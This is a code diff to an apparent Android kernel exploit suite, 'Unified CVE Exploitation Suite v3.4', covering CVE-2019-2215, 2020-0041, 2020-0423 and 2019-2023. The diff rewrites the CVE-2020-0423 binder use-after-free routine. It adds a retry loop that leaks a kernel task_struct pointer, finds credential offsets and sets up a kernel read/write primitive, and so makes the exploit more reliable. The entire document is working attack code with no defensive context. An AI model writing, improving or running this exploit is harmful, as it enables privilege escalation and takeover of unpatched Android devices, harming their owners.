@@ -39,7 +39,6 @@ extern int setfsgid(gid_t);
 #define TIMEOUT_MS 3000
 #define MAX_PARTITIONS 32
 #define DUMP_MAX_SIZE (20 * 1024 * 1024)
-#define SPRAY_PIPE_COUNT 64
 
 static int g_binder_fd = -1;
 static int g_epoll_fd = -1;
@@ -431,112 +430,96 @@ static int setup_kernel_rw(void) {
 static int exploit_cve_2020_0423_rw(void) {
     printf("[*] Attempting kernel RW via CVE-2020-0423 UAF...\n");
 
-    int binder_fd = open("/dev/binder", O_RDWR);
-    if (binder_fd < 0) { perror("  open binder"); return -1; }
+    for (int attempt = 0; attempt < 4; attempt++) {
+        int binder_fd = open("/dev/binder", O_RDWR);
+        if (binder_fd < 0) { perror("  open binder"); continue; }
 
-    int epoll_fd = epoll_create(100);
-    if (epoll_fd < 0) { perror("  epoll_create"); close(binder_fd); return -1; }
+        int epoll_fd = epoll_create(100);
+        if (epoll_fd < 0) { perror("  epoll_create"); close(binder_fd); continue; }
 
-    struct epoll_event ev = {.events = EPOLLIN};
-    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
-        perror("  epoll_ctl ADD");
-        close(binder_fd); close(epoll_fd); return -1;
-    }
+        struct epoll_event ev = {.events = EPOLLIN};
+        if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
+            perror("  epoll_ctl ADD");
+            close(binder_fd); close(epoll_fd); continue;
+        }
 
-    pid_t pid = fork();
-    if (pid < 0) {
-        perror("  fork");
-        close(binder_fd); close(epoll_fd);
-        return -1;
-    }
+        int leak_pipe[2];
+        if (pipe(leak_pipe) < 0) { perror("  pipe leak"); close(binder_fd); close(epoll_fd); continue; }
+        if (fcntl(leak_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+            perror("  fcntl leak");
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            continue;
+        }
 
-    if (pid == 0) {
-        usleep(50000);
-        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+        void *buf = mmap_page(0x100000000UL);
+        if (!buf) {
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            continue;
+        }
+
+        pid_t pid = fork();
+        if (pid < 0) {
+            perror("  fork");
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            continue;
+        }
+
+        if (pid == 0) {
+            usleep(40000 + (attempt * 5000));
+            ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+            usleep(10000);
+            write(leak_pipe[1], "X", 1);
+            close(binder_fd);
+            close(epoll_fd);
+            close(leak_pipe[0]);
+            close(leak_pipe[1]);
+            _exit(0);
+        }
+
+        struct epoll_event events[1];
+        int n = epoll_wait(epoll_fd, events, 1, 3000);
+        if (n <= 0) {
+            printf("  [-] epoll_wait failed or timeout (attempt %d)\n", attempt);
+            close(binder_fd); close(epoll_fd); close(leak_pipe[0]); close(leak_pipe[1]);
+            wait(NULL);
+            continue;
+        }
+        printf("  [+] epoll event received, reading leak pipe...\n");
+
+        ssize_t sz = read(leak_pipe[0], buf, PAGE_SIZE);
+        wait(NULL);
         close(binder_fd);
         close(epoll_fd);
-        _exit(0);
-    }
+        close(leak_pipe[0]);
+        close(leak_pipe[1]);
 
-    struct epoll_event events[1];
-    int n = epoll_wait(epoll_fd, events, 1, 3000);
-    if (n <= 0) {
-        printf("  [-] epoll_wait failed or timeout\n");
-        close(binder_fd); close(epoll_fd);
-        wait(NULL);
-        return -1;
-    }
-    printf("  [+] epoll event received, spraying...\n");
-
-    usleep(20000);
-
-    int spray_pipes[SPRAY_PIPE_COUNT][2];
-    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
-        if (pipe(spray_pipes[i]) < 0) {
-            perror("  pipe spray");
-            close(binder_fd); close(epoll_fd);
-            wait(NULL);
-            return -1;
+        if (sz <= 0) {
+            printf("  [-] read leak pipe failed (attempt %d)\n", attempt);
+            continue;
         }
-        if (fcntl(spray_pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
-            perror("  fcntl spray");
-        }
-        char buf[PAGE_SIZE];
-        memset(buf, 0x41, sizeof(buf));
-        write(spray_pipes[i][1], buf, sizeof(buf));
-    }
 
-    usleep(10000);
-
-    void *leak_buf = mmap_page(0x100000000UL);
-    if (!leak_buf) {
-        printf("  [-] mmap failed\n");
-        close(binder_fd); close(epoll_fd);
-        wait(NULL);
-        return -1;
-    }
-
-    ssize_t sz = 0;
-    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
-        sz = read(spray_pipes[i][0], leak_buf, PAGE_SIZE);
-        if (sz > 0) {
-            uint64_t *data = (uint64_t *)leak_buf;
-            for (size_t j = 0; j < (size_t)(sz / 8); j++) {
-                uint64_t val = data[j];
-                if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_task_struct = val;
-                    for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                        uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                        if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                            g_cred_off = g_offset_candidates[ci].cred;
-                            g_al_off = g_offset_candidates[ci].al;
-                            printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
-                                   (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                            if (pipe(g_krw_pipe) < 0) return -1;
-                            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
-                            close(binder_fd); close(epoll_fd);
-                            wait(NULL);
-                            for (int k = 0; k < SPRAY_PIPE_COUNT; k++) {
-                                close(spray_pipes[k][0]);
-                                close(spray_pipes[k][1]);
-                            }
-                            return 0;
-                        }
+        uint64_t *data = (uint64_t *)buf;
+        for (size_t i = 0; i < (size_t)(sz / 8); i++) {
+            uint64_t val = data[i];
+            if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                g_task_struct = val;
+                for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
+                    uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
+                    if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
+                        g_cred_off = g_offset_candidates[ci].cred;
+                        g_al_off = g_offset_candidates[ci].al;
+                        printf("  [+] Leaked task_struct @ 0x%llx (cred_off=0x%x, al_off=0x%x)\n",
+                               (unsigned long long)g_task_struct, g_cred_off, g_al_off);
+                        if (pipe(g_krw_pipe) < 0) return -1;
+                        if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+                        return 0;
                     }
                 }
             }
         }
+        printf("  [-] No kernel pointer in attempt %d\n", attempt);
     }
-
-    close(binder_fd);
-    close(epoll_fd);
-    wait(NULL);
-    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
-        close(spray_pipes[i][0]);
-        close(spray_pipes[i][1]);
-    }
-
-    printf("  [-] No kernel pointer found in leaked data\n");
+    printf("  [-] All attempts failed\n");
     return -1;
 }
 
@@ -899,7 +882,7 @@ int main(void) {
     int kernel_rw_obtained = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v3.3 (Enhanced)\n");
+    printf("  Unified CVE Exploitation Suite v3.4 (Fixed Leak)\n");
     printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023)\n");
     printf("==================================================\n\n");
 
